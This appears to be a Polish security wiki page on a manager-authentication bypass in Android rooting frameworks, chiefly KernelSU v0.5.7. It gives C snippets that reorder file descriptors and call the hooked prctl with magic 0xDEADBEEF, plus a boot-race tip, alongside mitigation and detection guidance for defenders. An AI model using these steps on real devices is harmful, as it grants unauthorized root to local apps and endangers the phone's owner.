# Android Rooting Frameworks (KernelSU/Magisk): obejście uwierzytelniania Managera i nadużycie hooka syscall

{{#include ../../banners/hacktricks-training.md}}

Frameworki rootingowe, takie jak KernelSU, APatch, SKRoot i Magisk, często modyfikują kernel Linux/Android i udostępniają uprzywilejowane funkcje nieuprzywilejowanej aplikacji userspace typu „manager” za pośrednictwem hookowanego syscall. Jeśli etap uwierzytelniania managera jest wadliwy, dowolna lokalna aplikacja może uzyskać dostęp do tego kanału i eskalować uprawnienia na urządzeniach, które zostały już zrootowane.

Ta strona przedstawia w uogólnionej formie techniki i problemy wykryte w publicznych badaniach (w szczególności w analizie KernelSU v0.5.7 przeprowadzonej przez Zimperium), aby pomóc zespołom red i blue zrozumieć powierzchnie ataku, prymitywy wykorzystywane podczas exploitation oraz solidne metody mitigacji.

---
## Wzorzec architektury: kanał managera oparty na hookowanym syscall

- Moduł/patch kernela hookuje syscall (zwykle prctl), aby odbierać „commands” z userspace.
- Protokół zazwyczaj ma postać: magic_value, command_id, arg_ptr/len ...
- Aplikacja managera w userspace najpierw się uwierzytelnia (np. CMD_BECOME_MANAGER). Gdy kernel oznaczy caller jako zaufanego managera, akceptowane są uprzywilejowane commands:
- Przyznanie caller uprawnień root (np. CMD_GRANT_ROOT)
- Zarządzanie allowlistami/deny-listami dla su
- Dostosowanie polityki SELinux (np. CMD_SET_SEPOLICY)
- Odczyt wersji/konfiguracji
- Ponieważ każda aplikacja może wywoływać syscall, poprawność uwierzytelniania managera ma kluczowe znaczenie.

Przykład (design KernelSU):
- Hookowany syscall: prctl
- Magic value przekierowująca do handlera KernelSU: 0xDEADBEEF
- Commands obejmują: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT itd.

---
## Przepływ uwierzytelniania KernelSU v0.5.7 (zgodnie z implementacją)

Gdy userspace wywołuje prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU weryfikuje:

1) Sprawdzenie prefiksu ścieżki
- Podana ścieżka musi zaczynać się od oczekiwanego prefiksu dla UID caller, np. /data/data/<pkg> lub /data/user/<id>/<pkg>.
- Reference: logika prefiksu ścieżki w core_hook.c (v0.5.7).

2) Sprawdzenie własności
- Właścicielem ścieżki musi być UID caller.
- Reference: logika własności w core_hook.c (v0.5.7).

3) Sprawdzenie sygnatury APK za pomocą skanowania tabeli FD
- Iterowane są otwarte file descriptors procesu wykonującego call.
- Wybierany jest pierwszy plik, którego ścieżka pasuje do /data/app/*/base.apk.
- Sygnatura APK v2 jest parsowana i weryfikowana względem oficjalnego certyfikatu managera.
- References: manager.c (iterowanie po FD), apk_sign.c (weryfikacja APK v2).

Jeśli wszystkie sprawdzenia zakończą się powodzeniem, kernel tymczasowo cache’uje UID managera i akceptuje uprzywilejowane commands pochodzące od tego UID do momentu resetu.

---
## Klasa podatności: zaufanie do „pierwszego pasującego APK” podczas iterowania po FD

Jeśli sprawdzenie sygnatury jest powiązane z „pierwszym pasującym /data/app/*/base.apk” znalezionym w tabeli FD procesu, w rzeczywistości nie weryfikuje ono pakietu caller. Atakujący może z wyprzedzeniem otworzyć poprawnie podpisany APK (prawdziwego managera), tak aby pojawił się w tabeli FD przed własnym base.apk.

To zaufanie oparte na pośredniej weryfikacji pozwala nieuprzywilejowanej aplikacji podszyć się pod managera bez posiadania jego klucza podpisującego.

Wykorzystywane właściwości:
- Skanowanie FD nie wiąże znalezionego pliku z tożsamością pakietu caller; jedynie dopasowuje wzorce ścieżek.
- open() zwraca najniższy dostępny FD. Zamykając najpierw FD o niższych numerach, atakujący może kontrolować kolejność.
- Filtr sprawdza wyłącznie, czy ścieżka pasuje do /data/app/*/base.apk — nie sprawdza, czy odpowiada ona zainstalowanemu pakietowi caller.

---
## Warunki wstępne ataku

- Urządzenie jest już zrootowane za pomocą podatnego frameworka rootingowego (np. KernelSU v0.5.7).
- Atakujący może lokalnie uruchamiać dowolny nieuprzywilejowany kod (proces aplikacji Android).
- Prawdziwy manager nie uwierzytelnił się jeszcze (np. bezpośrednio po restarcie). Niektóre frameworki cache’ują UID managera po pomyślnym uwierzytelnieniu; konieczne jest wygranie race.

---
## Zarys exploitation (KernelSU v0.5.7)

Kroki wysokiego poziomu:
1) Utwórz prawidłową ścieżkę do własnego katalogu danych aplikacji, aby spełnić sprawdzenia prefiksu i własności.
2) Dopilnuj, aby oryginalny plik KernelSU Manager base.apk został otwarty na FD o niższym numerze niż własny base.apk.
3) Wywołaj prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...), aby przejść sprawdzenia.
4) Wydaj uprzywilejowane commands, takie jak CMD_GRANT_ROOT, CMD_ALLOW_SU i CMD_SET_SEPOLICY, aby utrwalić elevację.

Uwagi praktyczne dotyczące kroku 2 (kolejność FD):
- Zidentyfikuj FD własnego /data/app/*/base.apk w procesie, przeglądając symlinki /proc/self/fd.
- Zamknij FD o niskim numerze (np. stdin, fd 0) i najpierw otwórz poprawny APK managera, aby zajął fd 0 (lub dowolny indeks niższy niż FD własnego base.apk).
- Dołącz poprawny APK managera do swojej aplikacji, aby jego ścieżka spełniała naiwny filtr kernela. Na przykład umieść go w podścieżce pasującej do /data/app/*/base.apk.

Przykładowe fragmenty kodu (Android/Linux, wyłącznie poglądowe):

Wyliczanie otwartych FD w celu znalezienia wpisów base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Wymuś, aby deskryptor FD o niższym numerze wskazywał na prawidłowy plik APK managera:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uwierzytelnianie Managera za pomocą hooka prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Po pomyślnym wykonaniu, uprzywilejowane commands (przykłady):
- CMD_GRANT_ROOT: promote bieżący proces do root
- CMD_ALLOW_SU: dodaj swój package/UID do allowlist dla trwałego su
- CMD_SET_SEPOLICY: dostosuj politykę SELinux zgodnie z możliwościami frameworka

Wskazówka dotycząca race/persistence:
- Zarejestruj receiver BOOT_COMPLETED w AndroidManifest (RECEIVE_BOOT_COMPLETED), aby uruchamiać się wcześnie po reboot i próbować uwierzytelnienia przed prawdziwym managerem.

---
## Wskazówki dotyczące wykrywania i ograniczania ryzyka

Dla developerów frameworków:
- Powiąż uwierzytelnianie z package/UID wywołującego, a nie z dowolnymi FD:
- Ustal package wywołującego na podstawie jego UID i zweryfikuj go względem sygnatury zainstalowanego package (przez PackageManager), zamiast skanować FD.
- Jeśli rozwiązanie jest kernel-only, używaj stabilnej tożsamości wywołującego (task creds) i przeprowadzaj walidację na stabilnym źródle prawdy zarządzanym przez init/userspace helper, a nie przez FD procesów.
- Unikaj sprawdzania prefiksu ścieżki jako tożsamości; wywołujący może je łatwo spełnić.
- Używaj challenge–response opartego na nonce przez kanał i czyść wszelką zbuforowaną tożsamość managera podczas boot lub po kluczowych zdarzeniach.
- Jeśli to możliwe, rozważ uwierzytelnione IPC oparte na binder zamiast przeciążania generycznych syscall.

Dla defenderów/blue team:
- Wykrywaj obecność rooting frameworks i procesów managera; monitoruj wywołania prctl z podejrzanymi magic constants (np. 0xDEADBEEF), jeśli masz telemetry z kernela.
- W zarządzanych flotach blokuj lub zgłaszaj receiver boot z niezaufanych packages, które szybko próbują wykonywać uprzywilejowane commands managera po boot.
- Upewnij się, że urządzenia mają zaktualizowane, patched wersje frameworków; unieważniaj zbuforowane ID managera po aktualizacji.

Ograniczenia ataku:
- Dotyczy wyłącznie urządzeń, które zostały już zrootowane przy użyciu podatnego frameworka.
- Zwykle wymaga reboot/race window przed uwierzytelnieniem legalnego managera (niektóre frameworki buforują UID managera do momentu reset).

---
## Powiązane uwagi dotyczące frameworków

- Uwierzytelnianie oparte na haśle (np. historyczne buildy APatch/SKRoot) może być słabe, jeśli hasła można odgadnąć/bruteforce’ować albo walidacje zawierają błędy.
- Uwierzytelnianie oparte na package/sygnaturze (np. KernelSU) jest zasadniczo silniejsze, ale musi wiązać się z rzeczywistym wywołującym, a nie z pośrednimi artefaktami, takimi jak skanowanie FD.
- Magisk: CVE-2024-48336 (MagiskEoP) pokazało, że nawet dojrzałe ekosystemy mogą być podatne na spoofing tożsamości prowadzący do wykonania kodu z root w kontekście managera.

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
